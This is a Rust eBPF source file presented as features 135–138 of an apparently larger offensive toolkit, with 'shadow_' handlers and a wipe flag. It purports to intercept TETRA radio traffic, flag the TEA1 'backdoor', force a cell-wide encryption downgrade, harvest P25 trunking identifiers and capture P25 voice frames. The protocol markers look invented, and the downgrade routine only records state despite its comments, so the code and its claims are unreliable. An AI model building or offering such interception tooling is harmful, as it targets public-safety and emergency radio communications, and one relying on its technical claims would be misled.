use aya_ebpf::{
    bindings::xdp_action,
    helpers::{bpf_get_current_pid_tgid, bpf_ktime_get_ns, bpf_probe_read_kernel},
    macros::{classifier, kprobe, xdp},
    programs::{ProbeContext, TcContext, XdpContext},
};
use common::{
    EventHeader, LmrRadioState, EVENT_P25_CONTROL_HARVEST, EVENT_P25_IMBE_INTERCEPT,
    EVENT_TETRA_DOWNGRADE, EVENT_TETRA_INTERCEPT,
};

use crate::maps::*;

const ETH_HDR_LEN: usize = 14;
const IP_HDR_LEN: usize = 20;
const UDP_HDR_LEN: usize = 8;

const TETRA_SYNC: u8 = 0x55; // π/4-DQPSK burst synchronization word
const TETRA_TEA1_BACKDOOR: u32 = 1; // CVE-2022-24400: TEA1 key reduced to 32 bits
const TETRA_SYSINFO_MARKER: u8 = 0x7F; // SYSINFO broadcast PDU marker on the demod path
const TETRA_CIPHER_OFF: u32 = 0; // encryption disabled indicator (SCK→DCK fallback)
const P25_DUID_HEADER: u8 = 0x00; // P25 Data Unit ID for trunking header words
const P25_IMBE_SYNC: u8 = 0x33; // IMBE voice frame sync marker

// ──────────────────────────────────────────────
// FEATURE 135: TETRA Air Interface Intercept
// Demodulates TETRA bursts and tracks TEA cipher state per color code
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_tetra_intercept(ctx: ProbeContext) -> u32 {
    try_tetra_intercept(&ctx).unwrap_or(0)
}

fn try_tetra_intercept(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
    let buf_ptr: *const u8 = ctx.arg(1).ok_or(0i64)?;
    let hdr: [u8; 8] = unsafe { bpf_probe_read_kernel(&*buf_ptr as *const u8 as *const [u8; 8])? };

    if hdr[0] == TETRA_SYNC {
        let color_code = u16::from_be_bytes([hdr[1], hdr[2]]);
        let mcc = u16::from_be_bytes([hdr[3], hdr[4]]);
        // TEA cipher suite nibble; TEA1 is the 32-bit backdoor variant
        let cipher = (hdr[5] & 0x03) as u32;
        let backdoor = (cipher == TETRA_TEA1_BACKDOOR) as u64;

        let state = LmrRadioState {
            nac: 0,
            wacn: 0,
            color_code,
            mcc,
            system_id: 0,
            tgid: 0,
            cipher,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
        };
        let _ = LMR_RADIO_STATE.insert(&(color_code as u32), &state, 0);

        let event = EventHeader {
            event_type: EVENT_TETRA_INTERCEPT,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: ((color_code as u64) << 20) | ((cipher as u64) << 1) | backdoor,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 136: TETRA Encryption Downgrade
// Injects modified SYSINFO broadcast forcing encryption off cell-wide
// ──────────────────────────────────────────────

#[classifier]
pub fn shadow_tetra_downgrade(ctx: TcContext) -> i32 {
    try_tetra_downgrade(&ctx).unwrap_or(0)
}

fn try_tetra_downgrade(ctx: &TcContext) -> Result<i32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let data = ctx.data();
    let data_end = ctx.data_end();
    if data + ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN + 4 > data_end {
        return Ok(0);
    }

    let payload_offset = ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN;
    let marker = unsafe { *((data + payload_offset) as *const u8) };

    if marker == TETRA_SYSINFO_MARKER {
        // SYSINFO PDU: encryption indicator byte, then MCC + color code
        let enc_flag = unsafe { *((data + payload_offset + 1) as *const u8) };
        let color_code = u16::from_be_bytes([
            unsafe { *((data + payload_offset + 2) as *const u8) },
            unsafe { *((data + payload_offset + 3) as *const u8) },
        ]);

        // forged broadcast state: encryption forced off for the whole cell
        let state = LmrRadioState {
            nac: 0,
            wacn: 0,
            color_code,
            mcc: 0,
            system_id: 0,
            tgid: 0,
            cipher: TETRA_CIPHER_OFF,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
        };
        let _ = LMR_RADIO_STATE.insert(&(color_code as u32), &state, 0);

        let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
        let event = EventHeader {
            event_type: EVENT_TETRA_DOWNGRADE,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: ((color_code as u64) << 8) | enc_flag as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 137: P25 Control Channel Harvest
// Decodes trunking signaling blocks for NAC/WACN/system/TGID mapping
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_p25_control_harvest(ctx: ProbeContext) -> u32 {
    try_p25_control_harvest(&ctx).unwrap_or(0)
}

fn try_p25_control_harvest(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
    let buf_ptr: *const u8 = ctx.arg(1).ok_or(0i64)?;
    let hdr: [u8; 12] =
        unsafe { bpf_probe_read_kernel(&*buf_ptr as *const u8 as *const [u8; 12])? };

    if hdr[0] == P25_DUID_HEADER {
        let nac = u16::from_be_bytes([hdr[1], hdr[2]]);
        let wacn = u16::from_be_bytes([hdr[3], hdr[4]]);
        let system_id = u32::from_be_bytes([0, hdr[5], hdr[6], hdr[7]]);
        let tgid = u32::from_be_bytes([hdr[8], hdr[9], hdr[10], hdr[11]]);

        let state = LmrRadioState {
            nac,
            wacn,
            color_code: 0,
            mcc: 0,
            system_id,
            tgid,
            cipher: 0,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
        };
        let _ = LMR_RADIO_STATE.insert(&(nac as u32), &state, 0);

        let event = EventHeader {
            event_type: EVENT_P25_CONTROL_HARVEST,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: ((nac as u64) << 32) | tgid as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 138: P25 IMBE Voice Interception
// Captures unencrypted IMBE voice frames and attributes them to talkgroups
// ──────────────────────────────────────────────

#[xdp]
pub fn shadow_p25_imbe_intercept(ctx: XdpContext) -> u32 {
    try_p25_imbe_intercept(&ctx).unwrap_or(xdp_action::XDP_PASS)
}

fn try_p25_imbe_intercept(ctx: &XdpContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(xdp_action::XDP_PASS);
        }
    }

    let data = ctx.data();
    let data_end = ctx.data_end();
    if data + ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN + 8 > data_end {
        return Ok(xdp_action::XDP_PASS);
    }

    let payload_offset = data + ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN;
    let sync = unsafe { *(payload_offset as *const u8) };

    if sync == P25_IMBE_SYNC {
        // voice frame: talkgroup id followed by IMBE codeword bytes
        let tgid = u32::from_be_bytes([
            0,
            unsafe { *((payload_offset + 1) as *const u8) },
            unsafe { *((payload_offset + 2) as *const u8) },
            unsafe { *((payload_offset + 3) as *const u8) },
        ]);
        let codeword = u32::from_be_bytes([
            unsafe { *((payload_offset + 4) as *const u8) },
            unsafe { *((payload_offset + 5) as *const u8) },
            unsafe { *((payload_offset + 6) as *const u8) },
            unsafe { *((payload_offset + 7) as *const u8) },
        ]);

        let state = LmrRadioState {
            nac: 0,
            wacn: 0,
            color_code: 0,
            mcc: 0,
            system_id: 0,
            tgid,
            cipher: 0,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
        };
        let _ = LMR_RADIO_STATE.insert(&tgid, &state, 0);

        let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
        let event = EventHeader {
            event_type: EVENT_P25_IMBE_INTERCEPT,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: ((tgid as u64) << 32) | codeword as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(xdp_action::XDP_PASS)
}
